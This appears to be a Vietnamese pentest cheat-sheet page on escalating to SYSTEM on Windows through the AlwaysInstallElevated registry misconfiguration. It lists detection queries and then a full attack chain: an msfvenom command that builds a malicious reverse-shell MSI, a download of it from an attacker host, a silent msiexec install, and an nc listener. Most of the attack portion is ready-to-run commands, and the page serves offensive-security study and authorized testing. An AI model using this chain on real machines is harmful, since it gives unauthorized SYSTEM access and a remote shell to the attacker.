# AlwaysInstallElevated

## Điểm chính khai thác

* Khai thác cấu hình **AlwaysInstallElevated** trong registry (HKLM hoặc HKCU) để chạy tệp MSI với đặc quyền **NT AUTHORITY\SYSTEM**, cho phép leo thang đặc quyền từ tài khoản người dùng thông thường.
* Cả hai khóa registry `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` và `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` phải có giá trị `AlwaysInstallElevated=1` để khai thác thành công.
* Công cụ như **SharpUp** và **winPEAS** tự động hóa việc phát hiện cấu hình AlwaysInstallElevated, giúp xác định nhanh các hệ thống dễ bị tấn công.
* Yêu cầu khả năng thực thi `msiexec` để kích hoạt payload.

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Kiểm tra khóa registry HKLM để xác định xem AlwaysInstallElevated có được bật cho tất cả người dùng:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Kiểm tra khóa registry HKCU để xác định xem AlwaysInstallElevated có được bật cho người dùng hiện tại:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Sử dụng winPEAS để liệt kê cấu hình AlwaysInstallElevated:

```
winPEAS.exe
```

#### Kiểm tra quyền truy cập hoặc cấu hình

#### Phân tích ngữ cảnh thực thi

Kiểm tra phiên bản hệ điều hành để đảm bảo khả năng tương thích với msiexec và payload MSI:

```
systeminfo
```

Output mong đợi: Phiên bản Windows, ví dụ: `Windows 10 Build 19044`

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo payload MSI độc hại để thiết lập reverse shell:

{% code overflow="wrap" %}

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -a x64 --platform Windows -f msi -o shell.msi
```

{% endcode %}

Tải payload MSI lên thư mục tạm trên mục tiêu:

```
iwr -Uri http://<kali_ip>/shell.msi -OutFile .\shell.msi
```

#### Áp dụng khai thác

Chạy payload MSI với msiexec để thực thi với đặc quyền SYSTEM:

```
msiexec /quiet /qn /i .\shell.msi
```

Chờ kết nối reverse shell:

```
nc -lvnp 443
```
